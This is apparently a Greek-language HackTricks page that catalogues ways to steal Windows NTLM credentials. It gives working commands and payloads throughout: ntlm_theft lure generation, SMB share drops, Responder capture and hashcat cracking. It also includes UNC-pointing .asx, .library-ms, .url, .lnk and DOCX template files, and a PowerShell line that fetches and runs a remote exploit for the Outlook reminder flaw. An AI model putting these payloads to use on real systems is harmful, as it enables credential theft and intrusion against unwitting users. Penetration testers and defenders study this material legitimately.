# Σημεία για να κλέψετε διαπιστευτήρια NTLM

{{#include ../../banners/hacktricks-training.md}}

**Δείτε όλες τις εξαιρετικές ιδέες από [https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/) — από το κατέβασμα ενός microsoft word αρχείου online μέχρι την ntlm leaks πηγή: https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md και [https://github.com/p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)**

### Εγγράψιμο SMB share + Explorer-triggered UNC lures (ntlm_theft/SCF/LNK/library-ms/desktop.ini)

Αν μπορείτε να **γράψετε σε ένα share που οι χρήστες ή προγραμματισμένες εργασίες περιηγούνται στο Explorer**, αποθέστε αρχεία των οποίων τα metadata δείχνουν στο UNC σας (π.χ. `\\ATTACKER\share`). Η απόδοση του φακέλου ενεργοποιεί **implicit SMB authentication** και leaks ένα **NetNTLMv2** στον listener σας.

1. **Δημιουργία lures** (περιλαμβάνει SCF/URL/LNK/library-ms/desktop.ini/Office/RTF/etc.)
```bash
git clone https://github.com/Greenwolf/ntlm_theft && cd ntlm_theft
uv add --script ntlm_theft.py xlsxwriter
uv run ntlm_theft.py -g all -s <attacker_ip> -f lure
```
2. **Αποθέστε τα στον εγγράψιμο κοινόχρηστο φάκελο** (οποιονδήποτε φάκελο που ανοίγει το θύμα):
```bash
smbclient //victim/share -U 'guest%'
cd transfer\
prompt off
mput lure/*
```
3. **Listen and crack**:
```bash
sudo responder -I <iface>          # capture NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt  # autodetects mode 5600
```
Windows may hit several files at once; anything Explorer previews (`BROWSE TO FOLDER`) requires no clicks.

### Windows Media Player playlists (.ASX/.WAX)

Αν μπορείτε να κάνετε έναν στόχο να ανοίξει ή να προεπισκοπήσει μια playlist του Windows Media Player που ελέγχετε, μπορείτε να leak Net‑NTLMv2 δείχνοντας την καταχώρηση σε ένα UNC path. Το WMP θα προσπαθήσει να κατεβάσει τα αναφερόμενα μέσα μέσω SMB και θα πραγματοποιήσει την πιστοποίηση αυτόματα.

Example payload:
```xml
<asx version="3.0">
<title>Leak</title>
<entry>
<title></title>
<ref href="file://ATTACKER_IP\\share\\track.mp3" />
</entry>
</asx>
```
Ροή συλλογής και cracking:
```bash
# Capture the authentication
sudo Responder -I <iface>

# Crack the captured NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
```
### ZIP-embedded .library-ms NTLM leak (CVE-2025-24071/24055)

Ο Windows Explorer χειρίζεται με ανασφαλή τρόπο τα αρχεία .library-ms όταν ανοίγονται απευθείας μέσα από ένα ZIP. Εάν ο ορισμός της βιβλιοθήκης δείχνει σε απομακρυσμένο UNC path (π.χ., \\attacker\share), απλή περιήγηση/εκκίνηση του .library-ms μέσα στο ZIP οδηγεί τον Explorer να enumerate το UNC και να στείλει NTLM authentication στον attacker. Αυτό παράγει ένα NetNTLMv2 που μπορεί να σπάσει offline ή ενδεχομένως να γίνει relayed.

Minimal .library-ms pointing to an attacker UNC
```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<version>6</version>
<name>Company Documents</name>
<isLibraryPinned>false</isLibraryPinned>
<iconReference>shell32.dll,-235</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<simpleLocation>
<url>\\10.10.14.2\share</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```
Operational steps
- Δημιουργήστε το αρχείο .library-ms με το παραπάνω XML (ορίστε το IP/hostname σας).
- Zip it (on Windows: Send to → Compressed (zipped) folder) και παραδώστε το ZIP στον στόχο.
- Τρέξτε έναν NTLM capture listener και περιμένετε να ανοίξει το θύμα το .library-ms από μέσα στο ZIP.


### Διαδρομή ήχου υπενθύμισης του Outlook (CVE-2023-23397) – zero‑click Net‑NTLMv2 leak

Microsoft Outlook for Windows επεξεργαζόταν την επεκταμένη ιδιότητα MAPI PidLidReminderFileParameter σε στοιχεία ημερολογίου. Εάν αυτή η ιδιότητα δείχνει σε μια UNC path (π.χ., \\attacker\share\alert.wav), το Outlook θα επικοινωνούσε με το SMB share όταν ενεργοποιηθεί η υπενθύμιση, leaking the user’s Net‑NTLMv2 without any click. Αυτό επιδιορθώθηκε στις March 14, 2023, αλλά παραμένει εξαιρετικά σχετικό για legacy/untouched fleets και για historical incident response.

Quick exploitation with PowerShell (Outlook COM):
```powershell
# Run on a host with Outlook installed and a configured mailbox
IEX (iwr -UseBasicParsing https://raw.githubusercontent.com/api0cradle/CVE-2023-23397-POC-Powershell/main/CVE-2023-23397.ps1)
Send-CalendarNTLMLeak -recipient user@example.com -remotefilepath "\\10.10.14.2\share\alert.wav" -meetingsubject "Update" -meetingbody "Please accept"
# Variants supported by the PoC include \\host@80\file.wav and \\host@SSL@443\file.wav
```
Πλευρά Listener:
```bash
sudo responder -I eth0  # or impacket-smbserver to observe connections
```
Σημειώσεις
- Το θύμα χρειάζεται μόνο να τρέχει Outlook for Windows όταν ενεργοποιηθεί η υπενθύμιση.
- Το leak παράγει Net‑NTLMv2 κατάλληλο για offline cracking ή relay (όχι pass‑the‑hash).


### .LNK/.URL icon-based zero‑click NTLM leak (CVE‑2025‑50154 – bypass of CVE‑2025‑24054)

Το Windows Explorer αποδίδει τα εικονίδια συντομεύσεων αυτόματα. Πρόσφατη έρευνα έδειξε ότι ακόμη και μετά το patch της Microsoft του Απριλίου 2025 για UNC‑icon shortcuts, ήταν ακόμα δυνατό να ενεργοποιηθεί NTLM authentication χωρίς κανένα κλικ φιλοξενώντας τον προορισμό της συντόμευσης σε UNC path και κρατώντας το εικονίδιο τοπικά (patch bypass με ανατεθέν CVE‑2025‑50154). Η απλή προβολή του φακέλου προκαλεί το Explorer να ανακτήσει τα metadata από τον απομακρυσμένο στόχο, εκπέμποντας NTLM στον SMB server του επιτιθέμενου.

Minimal Internet Shortcut payload (.url):
```ini
[InternetShortcut]
URL=http://intranet
IconFile=\\10.10.14.2\share\icon.ico
IconIndex=0
```
Συντόμευση προγράμματος payload (.lnk) μέσω PowerShell:
```powershell
$lnk = "$env:USERPROFILE\Desktop\lab.lnk"
$w = New-Object -ComObject WScript.Shell
$sc = $w.CreateShortcut($lnk)
$sc.TargetPath = "\\10.10.14.2\share\payload.exe"  # remote UNC target
$sc.IconLocation = "C:\\Windows\\System32\\SHELL32.dll" # local icon to bypass UNC-icon checks
$sc.Save()
```
Τρόποι παράδοσης
- Τοποθετήστε τη συντόμευση μέσα σε ένα ZIP και πείστε το θύμα να το περιηγηθεί.
- Τοποθετήστε τη συντόμευση σε ένα εγγράψιμο share που το θύμα θα ανοίξει.
- Συνδυάστε με άλλα lure αρχεία στον ίδιο φάκελο ώστε ο Explorer να κάνει προεπισκόπηση των αντικειμένων.

### No-click .LNK NTLM leak via ExtraData icon path (CVE‑2026‑25185)

Windows φορτώνει τα `.lnk` metadata κατά τη διάρκεια της **προβολής/προεπισκόπησης** (rendering εικονιδίου), όχι μόνο κατά την εκτέλεση. Το CVE‑2026‑25185 δείχνει ένα μονοπάτι parsing όπου τα **ExtraData** blocks προκαλούν το shell να επιλύσει ένα icon path και να αγγίξει το σύστημα αρχείων **κατά τη φόρτωση**, εκπέμποντας outbound NTLM όταν το path είναι απομακρυσμένο.

Κύριες συνθήκες ενεργοποίησης (παρατηρήθηκαν στο `CShellLink::_LoadFromStream`):
- Περιλάβετε τα **DARWIN_PROPS** (`0xa0000006`) στο ExtraData (πύλη προς τη ρουτίνα ενημέρωσης εικονιδίου).
- Περιλάβετε τα **ICON_ENVIRONMENT_PROPS** (`0xa0000007`) με το **TargetUnicode** συμπληρωμένο.
- Ο loader επεκτείνει τις μεταβλητές περιβάλλοντος στο `TargetUnicode` και καλεί τη `PathFileExistsW` για το προκύπτον path.

Αν το `TargetUnicode` επιλύεται σε UNC path (π.χ. `\\attacker\share\icon.ico`), η **απλή προβολή ενός φακέλου** που περιέχει τη συντόμευση προκαλεί outbound authentication. Η ίδια διαδρομή φόρτωσης μπορεί επίσης να πυροδοτηθεί από **indexing** και **AV scanning**, καθιστώντας την μια πρακτική επιφάνεια no‑click leak.

Εργαλεία έρευνας (parser/generator/UI) είναι διαθέσιμα στο project **LnkMeMaybe** για να δημιουργήσετε/επιθεωρήσετε αυτές τις δομές χωρίς τη χρήση του Windows GUI.


### Office remote template injection (.docx/.dotm) to coerce NTLM

Τα Office documents μπορούν να αναφέρονται σε ένα εξωτερικό template. Αν ρυθμίσετε το συνημμένο template σε UNC path, το άνοιγμα του εγγράφου θα πραγματοποιήσει authentication σε SMB.

Ελάχιστες αλλαγές στις σχέσεις DOCX (inside word/):

1) Επεξεργαστείτε το word/settings.xml και προσθέστε την αναφορά στο συνημμένο template:
```xml
<w:attachedTemplate r:id="rId1337" xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"/>
```
2) Επεξεργαστείτε το word/_rels/settings.xml.rels και ρυθμίστε το rId1337 ώστε να δείχνει στο UNC σας:
```xml
<Relationship Id="rId1337" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="\\\\10.10.14.2\\share\\template.dotm" TargetMode="External" xmlns="http://schemas.openxmlformats.org/package/2006/relationships"/>
```
3) Επανασυσκευάστε σε .docx και παραδώστε. Εκκινήστε τον SMB capture listener σας και περιμένετε το άνοιγμα.

Για ιδέες μετά την καταγραφή (post-capture) σχετικά με relaying ή κατάχρηση του NTLM, δείτε:

{{#ref}}
README.md
{{#endref}}


## Αναφορές
- [HTB: Breach – Writable share lures + Responder capture → NetNTLMv2 crack → Kerberoast svc_mssql](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
- [HTB Fluffy – ZIP .library‑ms auth leak (CVE‑2025‑24071/24055) → GenericWrite → AD CS ESC16 to DA (0xdf)](https://0xdf.gitlab.io/2025/09/20/htb-fluffy.html)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [Morphisec – 5 NTLM vulnerabilities: Unpatched privilege escalation threats in Microsoft](https://www.morphisec.com/blog/5-ntlm-vulnerabilities-unpatched-privilege-escalation-threats-in-microsoft/)
- [MSRC – Microsoft mitigates Outlook EoP (CVE‑2023‑23397) and explains the NTLM leak via PidLidReminderFileParameter](https://www.microsoft.com/en-us/msrc/blog/2023/03/microsoft-mitigates-outlook-elevation-of-privilege-vulnerability/)
- [Cymulate – Zero‑click, one NTLM: Microsoft security patch bypass (CVE‑2025‑50154)](https://cymulate.com/blog/zero-click-one-ntlm-microsoft-security-patch-bypass-cve-2025-50154/)
- [TrustedSec – LnkMeMaybe: A Review of CVE‑2026‑25185](https://trustedsec.com/blog/lnkmemaybe-a-review-of-cve-2026-25185)
- [TrustedSec LnkMeMaybe tooling](https://github.com/trustedsec/LnkMeMaybe)


{{#include ../../banners/hacktricks-training.md}}
